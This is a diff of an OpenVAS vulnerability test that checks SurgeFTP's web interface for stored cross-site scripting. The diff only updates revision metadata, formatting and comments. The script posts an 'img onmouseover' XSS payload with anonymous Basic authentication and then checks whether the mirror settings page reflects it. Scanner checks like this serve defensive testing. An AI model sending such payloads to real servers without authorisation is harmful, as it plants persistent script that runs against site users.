@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_surgeftp_web_intr_stored_xss_vuln.nasl 11291 2018-09-07 14:48:41Z mmartin $
+# $Id: gb_surgeftp_web_intr_stored_xss_vuln.nasl 11321 2018-09-11 10:05:53Z cfischer $
 #
 # Surgeftp Web Interface Multiple Stored XSS Vulnerabilities
 #
@@ -25,13 +25,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806805");
-  script_version("$Revision: 11291 $");
+  script_version("$Revision: 11321 $");
   script_tag(name:"cvss_base", value:"3.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:05:53 +0200 (Tue, 11 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-12-18 09:54:55 +0530 (Fri, 18 Dec 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Surgeftp Web Interface Multiple Stored XSS Vulnerabilities");
@@ -82,9 +82,8 @@ surg_port = get_http_port(default:7021);
 
 banner = get_http_banner(port:surg_port);
 
-##Cofirming application
 if('Basic realm="surgeftp' >!< banner){
-exit(0);
+  exit(0);
 }
 
 auth = base64(str:'anonymous:anonymous');
@@ -100,26 +99,21 @@ postData ='mirrorid=-1&mirror_ssl=TRUE&lcl=%3Cimg+src%3Dx+onmouseover%3Dalert%2'
           'x=23&cmd_mirror_save.y=16';
 len = strlen(postData );
 
-##Send POST Request
-sndReq1 ='POST '+url+' HTTP/1.1\r\n' +
-         'Host: '+host+'\r\n' +
-         'Authorization: Basic '+auth+'\r\n' +
+sndReq1 ='POST ' + url + ' HTTP/1.1\r\n' +
+         'Host: ' + host + '\r\n' +
+         'Authorization: Basic ' + auth + '\r\n' +
          'Content-Type: application/x-www-form-urlencoded\r\n' +
          'Content-Length: ' + len + '\r\n' +
          '\r\n' +
          postData;
 
-##Receive Response
 rcvRes1 = http_keepalive_send_recv(port:surg_port, data:sndReq1);
 if(rcvRes1 =~ "HTTP/1\.[0-9]+ 200 OK" && ">Mirror settings <" ><rcvRes1)
 {
-  ##Send Get request
   sndReq2 = 'GET /cgi/surgeftpmgr.cgi?cmd=mirrors HTTP/1.1\r\n' +
-            'Host: '+host+'\r\n' +
-            'Authorization: Basic '+auth+'\r\n' +
+            'Host: ' + host + '\r\n' +
+            'Authorization: Basic ' + auth + '\r\n' +
             '\r\n';
-
-  ##Receive response
   rcvRes2 = http_keepalive_send_recv(port:surg_port, data:sndReq2);
 
   if(rcvRes2 =~ "HTTP/1\.[0-9]+ 200 OK" &&
